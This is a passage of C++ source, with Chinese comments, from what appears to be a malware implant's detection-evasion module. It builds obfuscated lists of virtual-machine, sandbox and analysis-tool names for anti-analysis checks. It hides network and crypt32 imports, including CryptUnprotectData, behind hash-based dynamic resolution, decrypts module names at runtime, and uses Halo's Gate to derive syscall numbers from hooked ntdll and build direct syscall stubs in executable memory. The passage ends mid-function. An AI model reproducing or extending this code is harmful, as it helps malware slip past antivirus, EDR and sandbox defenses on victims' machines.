// ═══════════════════════════════════════════════════════════════════════════
//
// 覆盖的检查项（每条都对应 tools/verify_evasion.ps1 里的可实测判据）：
//   静态：IAT 敏感 DLL、明文 特征 字符串、版本信息、调试路径
//   动态：父进程关系、Sleep 加速、事件日志
//   行为：鼠标/键盘活动、进程与模块清单、用户名/计算机名、磁盘与内存规模
//   内存：ntdll inline hook、syscall 来源模块、非模块内存执行
//
// 实现约束（踩过的坑，改动前务必读）：
//   ① 所有从混淆标记解出的宽串必须落到**具名静态变量**再取 c_str()，
//      直接写 Widen(标记).c_str() 会把临时对象的指针存进数组 → 悬垂。
//   ② ntdll 的 Nt* 桩长度不是固定 32 字节（实测 0x20/0x30 混排），
//      用 RVA/32 推 SSN 会算错；必须按"导出序号 + SSN-有序"推导。
//   ③ Api::P 内部解析导出表时会递归调用 M()，必须用"先占槽再回填"避免死循环。
// ═══════════════════════════════════════════════════════════════════════════

#include "Compat.h"   // 已内含 generated_hashes.h / generated_strings.h

// ═══ 动态 API 别名 ═══════════════════════════════════════════════════════
// 作用：把本文件/被包含实现体里的敏感 API 调用重定向到动态解析封装，
//       从而不产生 wininet / crypt32 / shell32 的静态导入。
// 顺序约束（踩过两次）：
//   ① 必须在 **SDK 头文件之后**、EvAdapters.inc 之前。放最前面会污染
//      winreg.h/wininet.h 里的函数声明（宏把声明里的名字也换掉了，
//      报 ":: 左侧的符号必须是一种类型"）；
//   ② 必须在 #include "EvAdapters.inc" 之前定义；
//   ② 各封装自己的实现体要用原始名 → 见 EvAdaptersShell.inc 的 #undef 段。
// 代价：形参表必须与原始签名逐字一致（已在 EvAdapters.inc 里校准）。
//
// 例外：ShellExecuteExW / SHGetFolderPathW **不做别名**（实测两次失败）：
//   shlobj_core.h / winreg.h 里的声明在 SDK 头内部，别名宏会污染
//   后续被间接包含的声明，报":: 左侧的符号必须是一种类型"。
//   这两个改用**调用点显式**写 Ev* 封装。

#ifndef R6M_EVASION_ALIASES
#define R6M_EVASION_ALIASES
#define InternetOpenA        ::r6m::ev::EvInternetOpenA
#define InternetConnectA     ::r6m::ev::EvInternetConnectA
#define HttpOpenRequestA     ::r6m::ev::EvHttpOpenRequestA
#define HttpSendRequestA     ::r6m::ev::EvHttpSendRequestA
#define HttpQueryInfoA       ::r6m::ev::EvHttpQueryInfoA
#define InternetReadFile     ::r6m::ev::EvInternetReadFile
#define InternetCloseHandle  ::r6m::ev::EvInternetCloseHandle
#define InternetSetOptionA   ::r6m::ev::EvInternetSetOptionA
#define InternetQueryOptionA ::r6m::ev::EvInternetQueryOptionA
#define InternetCrackUrlA    ::r6m::ev::EvInternetCrackUrlA
#define CryptProtectData     ::r6m::ev::EvCryptProtectData
#define CryptUnprotectData   ::r6m::ev::EvCryptUnprotectData
#define CryptAcquireContextW ::r6m::ev::EvCryptAcquireContextW
#define CryptCreateHash      ::r6m::ev::EvCryptCreateHash
#define CryptHashData        ::r6m::ev::EvCryptHashData
#define CryptGetHashParam    ::r6m::ev::EvCryptGetHashParam
#define CryptDestroyHash     ::r6m::ev::EvCryptDestroyHash
#define CryptReleaseContext  ::r6m::ev::EvCryptReleaseContext
#define CryptGenRandom       ::r6m::ev::EvCryptGenRandom
#define CertFreeCertificateChain ::r6m::ev::EvCertFreeCertificateChain
#define RegOpenKeyExW        ::r6m::ev::EvRegOpenKeyExW
#define RegQueryValueExW     ::r6m::ev::EvRegQueryValueExW
#define RegCloseKey          ::r6m::ev::EvRegCloseKey
#endif


#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <intrin.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <cwchar>
#include <algorithm>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shell32.lib")

namespace r6m {
namespace ev {

// ═══════════════════════════════════════════════════════════════════════════
// 0) 宽串常量（全部走混淆，二进制中无明文）
//
//    统一用 XW() 宏定义：每个常量只在首次使用时一次构造，之后复用。
//    MSVC 保证函数局部 static 的线程安全初始化（C++11 起）。
// ═══════════════════════════════════════════════════════════════════════════
namespace str {

std::wstring Widen(const char* utf8) {
    if (!utf8 || !*utf8) return std::wstring();
    int n = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, nullptr, 0);
    if (n <= 1) return std::wstring();
    std::wstring w((size_t)(n - 1), L'\0');
    MultiByteToWideChar(CP_UTF8, 0, utf8, -1, &w[0], n);
    return w;
}

// 每个字面量一个取用函数。R6M_STR_<seed> 定义在 generated_strings.h。
//
// 两个宏都不能 #undef：调用点分布全文件，缺宏会让编译器把
// R6M_WSTR(name, SEED) 当成带整型后缀的数字字面量（报错极难定位）。
// seed 必须是**裸 hex 记号**（DEF 里用 ## 拼 R6M_STR_<hex>）。
//
// 必须带静态缓存：不能写成 return Widen(...) —— Widen 返回 std::wstring
// 临时量，转成 const wchar_t* 后在同一完整表达式结束时销毁；
// 在 `const wchar_t* keys[] = {...}` 这类数组初始化里会全部悬垂。
#define R6M_WSTR_DEF(name, seed) \
    const wchar_t* name() { static const std::wstring s = Widen(R6M_STR_##seed); return s.c_str(); }


// ── 路径 / 配置 ──
    R6M_WSTR_DEF(r6m_ini, B626C000CA5C3630)
    R6M_WSTR_DEF(agent_key, 6280952B223463C2)
    R6M_WSTR_DEF(server, 7294D77DB181DED2)
    R6M_WSTR_DEF(kernel32, 36F5905204A25919)
    R6M_WSTR_DEF(explorer, 93291E4078031384)
    R6M_WSTR_DEF(ntdll, BB7BB9A74C2F14FB)
    R6M_WSTR_DEF(bcrypt, 8CDE0AE255935465)
    R6M_WSTR_DEF(blob_subkey, C4D651AF11D5938A)
    R6M_WSTR_DEF(machine_guid, A5F74A9302328D8A)
    R6M_WSTR_DEF(machineguid, 292388E0073F42D7)
    R6M_WSTR_DEF(bios_bios, 8AC7350EA9649B17)
    R6M_WSTR_DEF(systemmanu, B25B42E7159BD04D)
    R6M_WSTR_DEF(systemprod, C5EF6F6DED8C89D8)
    R6M_WSTR_DEF(sys_desc, 6ED171B8DCA5F934)
    R6M_WSTR_DEF(videobios, C279CDE1E670AB3D)
    R6M_WSTR_DEF(disk_enum, 4DB00F47737FD804)

// ── 虚拟机进程 / 服务 ──
    R6M_WSTR_DEF(v_box, 5CD0AC00FC0E3846)
    R6M_WSTR_DEF(vmware, 18113D9654AB1189)
    R6M_WSTR_DEF(fn_virtual, 3A8BDBD8E17B835C)
    R6M_WSTR_DEF(qemu, A7B9F2080041DB55)
    R6M_WSTR_DEF(xen, BF959E197FD64B38)
    R6M_WSTR_DEF(p_vmsrvc, 8EB2FABA7C8281E6)
    R6M_WSTR_DEF(p_vmusrvc, 22C9018637CB0921)

// ── 虚拟机驱动文件 ──
    R6M_WSTR_DEF(p_vboxsvc, 8D287550F944C55D)
    R6M_WSTR_DEF(p_vboxtray, 4287EC097402EFCA)
    R6M_WSTR_DEF(p_vmtoolsd, FC33C9EB0A022661)
    R6M_WSTR_DEF(p_vmwtray, 0F3030AFBB869DE9)
    R6M_WSTR_DEF(p_xensvc, 6E50E85644C57C8B)
    R6M_WSTR_DEF(p_qemuga, 520DAF746C050B14)
    R6M_WSTR_DEF(f_vboxmouse, 5A03FAF704F3B7EA)

    R6M_WSTR_DEF(f_vboxguest, 93F383F7859A467D)
    R6M_WSTR_DEF(f_vmhgfs, D3094852F1146A0D)
    R6M_WSTR_DEF(f_vmmouse, 2F0CE119123DC4D0)
    R6M_WSTR_DEF(f_vmci, 63F5B62A4341731B)
    R6M_WSTR_DEF(f_qemuga, CA42EB3E8D3DAE43)
    R6M_WSTR_DEF(f_vboxsf, 7553CDFAE4BCEE64)
    R6M_WSTR_DEF(u_sandbox, 2E3C6336DA5A2A44)
    R6M_WSTR_DEF(u_maltest, DE75AA70E9F24D35)
    R6M_WSTR_DEF(u_malware, 16B6F976C0EFA170)
    R6M_WSTR_DEF(u_virus, 3AC5DD51EA6FDBFE)
    R6M_WSTR_DEF(u_tequila, E38411D9A0F263A0)
    R6M_WSTR_DEF(u_wsandbox, 181C566DE370CF21)
    R6M_WSTR_DEF(u_hal9th, E3E8183C4E364E5D)
    R6M_WSTR_DEF(u_john, 55F311E98CBC275C)
    R6M_WSTR_DEF(u_payload, 3B89F90689249305)
    R6M_WSTR_DEF(u_peter, 39848C84669EB3C9)
    R6M_WSTR_DEF(u_test, F9E6E6EF197C2B25)
    R6M_WSTR_DEF(u_admin, E5CDE7FDDA328454)
    R6M_WSTR_DEF(c_userpc, DD59ADDD48F599AC)
    R6M_WSTR_DEF(c_johnpc, 5EB00B090CAEE1BE)
    R6M_WSTR_DEF(c_sand1, 4BD1FF676BCEEC16)
    R6M_WSTR_DEF(t_wireshark, 6EA31E2F07F2C893)

// ── 分析工具进程 ──
    R6M_WSTR_DEF(t_fiddler, 78DFFF95974B1315)
    R6M_WSTR_DEF(t_x64dbg, 944FACB6F978A5F2)
    R6M_WSTR_DEF(t_x32dbg, 6196970BECE2D9F3)
    R6M_WSTR_DEF(t_ollydbg, A16CD36DD11C8BF2)
    R6M_WSTR_DEF(t_ida64, 7162BBCA73306A1F)
    R6M_WSTR_DEF(t_ida, 482006F2B18B11ED)
    R6M_WSTR_DEF(t_idaq, 54B510BF55896E38)
    R6M_WSTR_DEF(t_idaq64, 055263751AA945C2)
    R6M_WSTR_DEF(t_windbg, BDCBC3DAC913DFD6)
    R6M_WSTR_DEF(t_prochacker, 95050A224A3B7816)
    R6M_WSTR_DEF(t_procmon, C274EF461FC53033)
    R6M_WSTR_DEF(t_procmon64, 2334D5700BE5A631)
    R6M_WSTR_DEF(t_procexp, 13ED80E542433C9A)
    R6M_WSTR_DEF(t_procexp64, 0229D9A13D3D6298)
    R6M_WSTR_DEF(t_tcpview, 168B5F1AAD3994CF)
    R6M_WSTR_DEF(t_autoruns, 880C486DCC4145EA)
    R6M_WSTR_DEF(t_filemon, B2D4172F7A6F687D)
    R6M_WSTR_DEF(t_regmon, C35485D4E397EE9F)
    R6M_WSTR_DEF(t_immunity, 53DF15924D95611E)
    R6M_WSTR_DEF(t_scylla, 2C419637F340EC63)
    R6M_WSTR_DEF(t_peid, B56BB17F7D3F071D)
    R6M_WSTR_DEF(t_lordpe, F08501ECBF70B36F)
    R6M_WSTR_DEF(t_dumpit, C8579BA6E00641F4)
    R6M_WSTR_DEF(t_frida, 3BF88CDD70810511)
    R6M_WSTR_DEF(w_x64dbg, 9F5627C8D228677C)
    R6M_WSTR_DEF(w_x32dbg, 75CCD62A897B7B2D)
    R6M_WSTR_DEF(w_olly, 7AA52B385191D87C)

// ── 窗口标题关键字 ──
    R6M_WSTR_DEF(w_ida, 4119D819C913A3B3)
    R6M_WSTR_DEF(w_windbg, 499CBFA7697DABE8)
    R6M_WSTR_DEF(w_procmon, 4CFA4643417B5DF0)
    R6M_WSTR_DEF(w_prochk, 2DB8E795F2747B24)
    R6M_WSTR_DEF(w_wireshark, 51A415F9923695AD)
    R6M_WSTR_DEF(w_fiddler, CED0DFA082BA0D1B)
    R6M_WSTR_DEF(w_ce, CDD4597DE01F2BEE)
    R6M_WSTR_DEF(w_imm, D9039AE5F7599E17)

} // namespace str

// 调用侧宏：把 R6M_WSTR(name, SEED) 展开为 str::name()。
// **不能 #undef**：调用点分布全文件，缺宏时编译器会把
// R6M_WSTR(bios_bios, 8AC7...) 当成带整型后缀的数字字面量，
// 报 "文本后缀 ... 无效"，极难定位。
#define R6M_WSTR(name, seed) ::r6m::ev::str::name()


// 便捷：把 XW 函数们按数组用

namespace {

inline uint64_t tsc() { return (uint64_t)__rdtsc(); }
#pragma intrinsic(__rdtsc)

std::string Narrow(const std::wstring& w) {
    if (w.empty()) return std::string();
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    if (n <= 0) return std::string();
    std::string s((size_t)n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &s[0], n, nullptr, nullptr);
    return s;
}

std::wstring ToLower(std::wstring s) {
    for (auto& c : s) c = (wchar_t)towlower(c);
    return s;
}
bool ContainsI(const std::wstring& hay, const wchar_t* needle) {
    if (!needle || !*needle) return false;
    return ToLower(hay).find(ToLower(needle)) != std::wstring::npos;
}

// 词边界版子串匹配：命中处的前一个与后一个字符都不能是字母/数字。
//
bool ContainsWordI(const std::wstring& hay, const wchar_t* needle) {
    if (!needle || !*needle) return false;
    const std::wstring h = ToLower(hay);
    const std::wstring n = ToLower(needle);
    auto alnum = [](wchar_t c) { return (c >= L'0' && c <= L'9') || (c >= L'a' && c <= L'z'); };
    size_t pos = 0;
    while ((pos = h.find(n, pos)) != std::wstring::npos) {
        const wchar_t prev = pos == 0 ? 0 : h[pos - 1];
        const wchar_t next = (pos + n.size() < h.size()) ? h[pos + n.size()] : 0;
        if (!alnum(prev) && !alnum(next)) return true;
        pos += 1;
    }
    return false;
}

// 加密随机。bcrypt.dll 通过 GetModuleHandleA 获取（避免在 IAT 里出现 BCryptGenRandom）
bool RandBytes(void* out, size_t n) {
    typedef LONG(WINAPI* Gen_t)(void*, unsigned char*, unsigned long, unsigned long);
    static Gen_t gen = nullptr;
    static bool tried = false;
    if (!tried) {
        tried = true;
        HMODULE h = GetModuleHandleA("bcrypt.dll");
        if (!h) h = LoadLibraryA("bcrypt.dll");
        if (h) gen = (Gen_t)GetProcAddress(h, "BCryptGenRandom");
    }
    if (gen) {
        // BCRYPT_USE_SYSTEM_PREFERRED_RNG = 0x00000002
        if (gen(nullptr, (unsigned char*)out, (unsigned long)n, 0x00000002) == 0) return true;
    }
    LARGE_INTEGER q{};
    QueryPerformanceCounter(&q);
    uint64_t x = (uint64_t)q.QuadPart ^ ((uint64_t)GetTickCount64() << 17) ^ tsc() ^ (uint64_t)GetCurrentThreadId();
    for (size_t i = 0; i < n; i++) {
        x ^= x << 13; x ^= x >> 7; x ^= x << 17;
        ((unsigned char*)out)[i] = (unsigned char)(x >> 24);
    }
    return false;
}

// 动态决议的 advapi32 注册表读串
bool RegReadStr(HKEY root, const wchar_t* sub, const wchar_t* val, std::wstring& out) {
    typedef LSTATUS(WINAPI* Open_t)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
    typedef LSTATUS(WINAPI* Query_t)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    typedef LSTATUS(WINAPI* Close_t)(HKEY);
    auto pOpen = (Open_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegOpenKeyExW);
    auto pQuery = (Query_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegQueryValueExW);
    auto pClose = (Close_t)Api::P(R6M_M_ADVAPI32, R6M_H_RegCloseKey);
    if (!pOpen || !pQuery || !pClose) return false;
    HKEY k = nullptr;
    if (pOpen(root, sub, 0, KEY_READ | KEY_WOW64_64KEY, &k) != ERROR_SUCCESS) return false;
    wchar_t buf[512] = {};
    DWORD cb = sizeof(buf) - sizeof(wchar_t), type = 0;
    LSTATUS st = pQuery(k, val, nullptr, &type, (LPBYTE)buf, &cb);
    pClose(k);
    if (st != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ) || cb == 0) return false;
    out.assign(buf, cb / sizeof(wchar_t));
    return true;
}

DWORD FindPidByName(const wchar_t* name) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

} // anonymous namespace

// ═══════════════════════════════════════════════════════════════════════════
// 1) 动态 API 决议
// ═══════════════════════════════════════════════════════════════════════════

uint64_t Api::NameHash(const char* name) {
    uint64_t h = 0xcbf29ce484222325ULL;
    for (const unsigned char* p = (const unsigned char*)name; *p; ++p) { h ^= (uint64_t)*p; h *= 0x100000001b3ULL; }
    return h;
}


namespace {
// ── 按需加载模块（IAT 摘除后必须主动拉起）────────────────────────────────
//
// **不再加载**这两个模块；而 Api::M 只在"已加载模块"里按哈希找（原注释：
// 不碰磁盘、不触发 LoadLibrary）→ 永远找不到 → 所有经封装的调用返回失败默认值。
// 实测现象（2026-10-07 端到端）：进程能跑、日志正常，但 InternetOpenA 返回
// NULL → "HTTP session FAILED" → 后续全部 "URL parse failed"，一个请求都发不
//
// 做法：模块名只以密文形式存在（与 strtab 同一 keystream：
//   enc[i] = plain[i] ^ keybyte(seed, i)，seed = fnv1a64(明文)），
// 第一次需要时解密到栈上再 LoadLibraryA，用完立即擦除栈上副本。
// 这样文件里搜不到模块名明文，功能也正常。
struct ObfModName { uint64_t modHash; uint64_t seed; uint32_t len; const char* enc; };

const ObfModName kLazyModules[] = {
    { R6M_M_WININET, 0x32EACF116EB05411ULL, 11u, "\xce\xef\xf8\xe5\x92\x83\x8e\x6f\x6b\x15\x96" }, // wininet.dll
    { R6M_M_CRYPT32, 0x92BF98D2DF731CD8ULL, 11u, "\x3a\xb3\xcc\x2f\x8d\xed\x9d\xdf\x2c\x07\x05" }, // crypt32.dll
    { R6M_M_SHELL32, 0x03570C19E39BC836ULL, 11u, "\xd0\x8f\x94\x63\xbb\x8a\xca\xc5\x68\xb4\xa2" }, // shell32.dll
    { R6M_M_ADVAPI32, 0xD98AEB041E16F7B5ULL, 12u, "\x94\xfa\xee\xc4\x25\x9b\x0b\x51\xfa\x3f\xb9\xc2" }, // advapi32.dll
    { R6M_M_IPHLPAPI, 0xF0FC2D54776870CAULL, 12u, "\x58\x86\xd5\xff\x84\x4f\x4f\x8c\x05\x9f\xc3\x9d" }, // iphlpapi.dll
};

// 按模块哈希尝试加载；返回 nullptr 表示不在本表内或加载失败
void* TryLoadModule(uint64_t modHash) {
    for (const auto& m : kLazyModules) {
        if (m.modHash != modHash) continue;
        if (m.len == 0 || m.len >= 64) return nullptr;
        char plain[64] = {};
        for (uint32_t i = 0; i < m.len; i++)
            plain[i] = (char)((unsigned char)m.enc[i] ^ ::r6m::ev::keybyte(m.seed, i));
        plain[m.len] = 0;
        HMODULE h = LoadLibraryA(plain);
        SecureZeroMemory(plain, sizeof(plain));   // 不留栈上明文
        return (void*)h;
    }
    return nullptr;
}
} // namespace

void* Api::M(uint64_t modHash) {
    static struct { uint64_t h; void* p; } cache[32] = {};
    static int n = 0;
    for (int i = 0; i < n; i++) if (cache[i].h == modHash) return cache[i].p;

    // 只在已加载模块里找（不碰磁盘、不触发 LoadLibrary 的可疑行为）
    HMODULE mods[512] = {};
    DWORD need = 0;
    if (!EnumProcessModules(GetCurrentProcess(), mods, sizeof(mods), &need)) return nullptr;
    int count = (int)(need / sizeof(HMODULE));
    for (int i = 0; i < count && i < 512; i++) {
        char path[MAX_PATH] = {};
        if (!GetModuleFileNameA(mods[i], path, MAX_PATH)) continue;
        const char* base = strrchr(path, '\\');
        base = base ? base + 1 : path;
        // 模块名统一按小写比较（磁盘上可能是 NTDLL.DLL）
        char low[MAX_PATH] = {};
        for (size_t j = 0; j < strlen(base) && j < MAX_PATH - 1; j++) low[j] = (char)tolower((unsigned char)base[j]);
        if (NameHash(low) != modHash) continue;
        if (n < 32) { cache[n].h = modHash; cache[n].p = (void*)mods[i]; n++; }
        return (void*)mods[i];
    }
    // 已加载模块里没有 → 主动加载（IAT 被摘除后这是唯一的通路，见 kLazyModules 说明）
    void* lazy = TryLoadModule(modHash);
    if (lazy && n < 32) { cache[n].h = modHash; cache[n].p = lazy; n++; }
    return lazy;
}

void* Api::P(uint64_t modHash, uint64_t procHash) {
    static struct { uint64_t k; void* p; bool done; } cache[192] = {};
    static int n = 0;
    const uint64_t key = modHash * 0x100000001b3ULL ^ procHash;

    // 已在缓存（含"解析中"占位）直接返回
    for (int i = 0; i < n; i++) {
        if (cache[i].k != key) continue;
        if (!cache[i].done) return nullptr;   // 递归保护：解析中
        return cache[i].p;
    }
    if (n >= 192) return nullptr;

    const int slot = n++;
    cache[slot].k = key;
    cache[slot].p = nullptr;
    cache[slot].done = false;

    // 通用：直接解析目标模块的导出表（不调用 GetProcAddress —— 它可能被 hook）
    void* p = ExportByName((HMODULE)Api::M(modHash), procHash);

    cache[slot].p = p;
    cache[slot].done = true;
    return p;
}

// ═══════════════════════════════════════════════════════════════════════════
// 2) PE 导出表解析（通用，模块可以是 ntdll 也可以是 kernel32）
// ═══════════════════════════════════════════════════════════════════════════

namespace {
struct ModImage {
    uint8_t*  base = nullptr;
    uint32_t* nameRvas = nullptr;
    uint16_t* nameOrds = nullptr;
    uint32_t* funcRvas = nullptr;
    uint32_t  nameCount = 0;
    uint32_t  expRva = 0, expSize = 0;
    bool      ok = false;
};
// 每模块缓存一份解析结果（最多 8 个模块）
ModImage* GetImage(HMODULE h) {
    static struct { HMODULE h; ModImage img; } cache[8] = {};
    static int n = 0;
    if (!h) return nullptr;
    for (int i = 0; i < n; i++) if (cache[i].h == h) return &cache[i].img;
    if (n >= 8) return nullptr;
    ModImage& img = cache[n].img;
    cache[n].h = h;
    n++;
    auto* dos = (IMAGE_DOS_HEADER*)h;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return &img;
    auto* nt = (IMAGE_NT_HEADERS64*)((uint8_t*)h + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return &img;
    img.base = (uint8_t*)h;
    auto& exp = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    img.expRva = exp.VirtualAddress;
    img.expSize = exp.Size;
    if (!exp.VirtualAddress || !exp.Size) return &img;
    auto* dir = (IMAGE_EXPORT_DIRECTORY*)(img.base + exp.VirtualAddress);
    img.nameRvas = (uint32_t*)(img.base + dir->AddressOfNames);
    img.nameOrds = (uint16_t*)(img.base + dir->AddressOfNameOrdinals);
    img.funcRvas = (uint32_t*)(img.base + dir->AddressOfFunctions);
    img.nameCount = dir->NumberOfNames;
    img.ok = true;
    return &img;
}
} // namespace

void* ExportByName(HMODULE hMod, uint64_t procHash) {
    ModImage* img = GetImage(hMod);
    if (!img || !img->ok) return nullptr;
    for (uint32_t i = 0; i < img->nameCount; i++) {
        const char* nm = (const char*)(img->base + img->nameRvas[i]);
        uint64_t h = 0xcbf29ce484222325ULL;
        for (const unsigned char* p = (const unsigned char*)nm; *p; ++p) { h ^= *p; h *= 0x100000001b3ULL; }
        if (h != procHash) continue;
        uint32_t rva = img->funcRvas[img->nameOrds[i]];
        // 转发导出（RVA 落在导出目录内）说明实现在别的 DLL，不能直接用
        if (rva >= img->expRva && rva < img->expRva + img->expSize) return nullptr;
        return img->base + rva;
    }
    return nullptr;
}

// ═══════════════════════════════════════════════════════════════════════════
// 3) 直系统调用
// ═══════════════════════════════════════════════════════════════════════════

void* NtdllExport(uint64_t procHash) {
    // 同样只用 GetModuleHandleA（见 NtdllSsn 的说明：避免 Api::M ⇄ Image 环）
    return ExportByName(GetModuleHandleA("ntdll.dll"), procHash);
}

// 判定标准 syscall 桩：4C 8B D1 B8 <ssn:4> ... 0F 05 C3
// 实测（Win10 19045）SSN 位于 +0x04，syscall;ret 位于 +0x12。
static bool StubLayout(const uint8_t* p, uint32_t* ssnOut) {
    if (p[0] != 0x4C || p[1] != 0x8B || p[2] != 0xD1 || p[3] != 0xB8) return false;
    if (p[0x12] != 0x0F || p[0x13] != 0x05 || p[0x14] != 0xC3) return false;
    uint32_t ssn = *(const uint32_t*)(p + 4);
    if (ssn > 0x400) return false;
    if (ssnOut) *ssnOut = ssn;
    return true;
}

// 建立"导出序号 → (RVA, SSN)"全表并按序号排序，用于 hook 时推算 SSN。
// 依据：ntdll 的 Nt* 导出**按 SSN 顺序**排列在导出名称表里，
//       因此序号差 == SSN 差；再用相邻未 hook 桩校验该关系成立。
int32_t NtdllSsn(uint64_t procHash) {
    // 注意：这里**不能**用 Api::M(R6M_M_NTDLL)。Image()/Api::M()/ExportByName()
    // 三者互相可达，经 Api::M 进 Image() 会在 ntdll 静态初始化期间形成环。
    // GetModuleHandleA 不需要任何我们的辅助设施，是安全入口。
    HMODULE hMod = GetModuleHandleA("ntdll.dll");
    ModImage* img = GetImage(hMod);
    if (!img || !img->ok) return -1;

    struct Ent { uint32_t idx; uint32_t rva; uint32_t ssn; };
    static Ent* ents = nullptr;
    static uint32_t nent = 0;
    static uint32_t selfIdx = 0xFFFFFFFF;
    static uint32_t selfRva = 0;

    // 定位目标函数的导出序号（名字哈希）
    bool targetFound = false;
    for (uint32_t i = 0; i < img->nameCount; i++) {
        const char* nm = (const char*)(img->base + img->nameRvas[i]);
        uint64_t h = 0xcbf29ce484222325ULL;
        for (const unsigned char* p = (const unsigned char*)nm; *p; ++p) { h ^= *p; h *= 0x100000001b3ULL; }
        if (h != procHash) continue;
        selfIdx = i;
        selfRva = img->funcRvas[img->nameOrds[i]];
        targetFound = true;
        break;
    }
    if (!targetFound) return -1;

    // 未 hook：直接读 SSN
    uint32_t ssn = 0;
    if (StubLayout(img->base + selfRva, &ssn)) return (int32_t)ssn;

    // ── 被 hook：Halo's Gate ──
    if (!ents) {
        ents = (Ent*)malloc(sizeof(Ent) * (img->nameCount + 1));
        if (!ents) return -1;
        for (uint32_t i = 0; i < img->nameCount; i++) {
            uint32_t rva = img->funcRvas[img->nameOrds[i]];
            uint32_t s = 0;
            if (!StubLayout(img->base + rva, &s)) continue;   // 只收"干净桩"
            ents[nent].idx = i;
            ents[nent].rva = rva;
            ents[nent].ssn = s;
            nent++;
        }
        std::sort(ents, ents + nent, [](const Ent& a, const Ent& b) { return a.idx < b.idx; });
    }

    // 找序号最接近的两个"干净"邻居夹住目标，用它们的 (idx, ssn) 线性插值
    const Ent* lo = nullptr;   // idx 小于目标的最大者
    const Ent* hi = nullptr;   // idx 大于目标的最小者
    // 序号有序 → 二分
    uint32_t l = 0, r = nent;
    while (l < r) {
        uint32_t m = (l + r) / 2;
        if (ents[m].idx < selfIdx) { lo = &ents[m]; l = m + 1; }
        else { hi = &ents[m]; r = m; }
    }
    if (!lo && !hi) return -1;
    if (lo && hi && hi->idx != lo->idx && hi->ssn >= lo->ssn) {
        double slope = (double)(hi->ssn - lo->ssn) / (double)(hi->idx - lo->idx);
        double guess = (double)lo->ssn + slope * (double)(selfIdx - lo->idx);
        long g = (long)(guess + 0.5);
        if (g >= 0 && g <= 0x400) return (int32_t)g;
    }
    // 只有一侧可用：假定 slope == 1（绝大多数区间成立）
    if (lo && selfIdx - lo->idx < 0x40) {
        int32_t g = (int32_t)lo->ssn + (int32_t)(selfIdx - lo->idx);
        if (g >= 0 && g <= 0x400) return g;
    }
    if (hi && hi->idx - selfIdx < 0x40) {
        int32_t g = (int32_t)hi->ssn - (int32_t)(hi->idx - selfIdx);
        if (g >= 0 && g <= 0x400) return g;
    }
    return -1;
}

namespace {
uint8_t* g_pool = nullptr;
size_t   g_poolUsed = 0;
const size_t kPoolSize = 0x4000;
CRITICAL_SECTION g_poolLock;
bool g_poolReady = false;
LONG g_syscallMisses = 0;   // SSN 解析失败次数（上报用）
}

void InitSyscallPool() {
    return;  // [EV-REMOVED] 系统调用池已停用

    if (g_pool) return;
    if (!g_poolReady) { InitializeCriticalSection(&g_poolLock); g_poolReady = true; }
    EnterCriticalSection(&g_poolLock);
    if (!g_pool) {
        // 必须用 **kernel32!VirtualAlloc**，不能走直系统调用：
        //   直系统调用需要桩 → 桩需要桩池 → 桩池在这里分配 = 无限递归 → 栈溢出。
        // （实测 cdb 栈回溯：InitSyscallPool → NtAllocateVirtualMemory →
        //   SyscallSlot → BuildSyscallStub → InitSyscallPool …）
        g_pool = (uint8_t*)VirtualAlloc(nullptr, kPoolSize, MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
        if (g_pool) memset(g_pool, 0x90, kPoolSize);   // 未用区域填 NOP，不出现垃圾字节
    }
    LeaveCriticalSection(&g_poolLock);
}

void* BuildSyscallStub(int32_t ssn) {
    if (ssn < 0) return nullptr;
    InitSyscallPool();
    if (!g_pool) return nullptr;
    EnterCriticalSection(&g_poolLock);
    if (g_poolUsed + 32 > kPoolSize) { LeaveCriticalSection(&g_poolLock); return nullptr; }
    uint8_t* stub = g_pool + g_poolUsed;
    g_poolUsed += 32;
    LeaveCriticalSection(&g_poolLock);

    // 与 ntdll 同形态，避免"非典型桩"成为内存特征
    static const uint8_t tail[] = {
        0xF6,0x04,0x25,0x08,0x03,0xFE,0x7F,0x01,   // test byte ptr [7FFE0308h], 1
        0x75,0x03,                                  // jnz +3
        0x0F,0x05,                                  // syscall
        0xC3,                                       // ret
        0xCD,0x2E,0xC3,                             // int 2Eh; ret（x86 兼容，不会被走）
        0x00
    };
    stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1; stub[3] = 0xB8;
    *(uint32_t*)(stub + 4) = (uint32_t)ssn;
    memcpy(stub + 8, tail, sizeof(tail));
    FlushInstructionCache(GetCurrentProcess(), stub, 32);
    return stub;
}

void* SyscallSlot(uint64_t procHash, bool* okOut) {
    static struct { uint64_t h; void* p; } cache[32] = {};
    static int n = 0;
    static CRITICAL_SECTION cs;
    static bool csReady = false;
    if (!csReady) { InitializeCriticalSection(&cs); csReady = true; }

    EnterCriticalSection(&cs);
    for (int i = 0; i < n; i++) {
        if (cache[i].h == procHash) {
            void* p = cache[i].p;
            LeaveCriticalSection(&cs);
            if (okOut) *okOut = (p != nullptr);
            return p;
        }
    }
    void* stub = nullptr;
    bool viaSyscall = false;
    if (Cfg().enabled && Cfg().useSyscalls) {
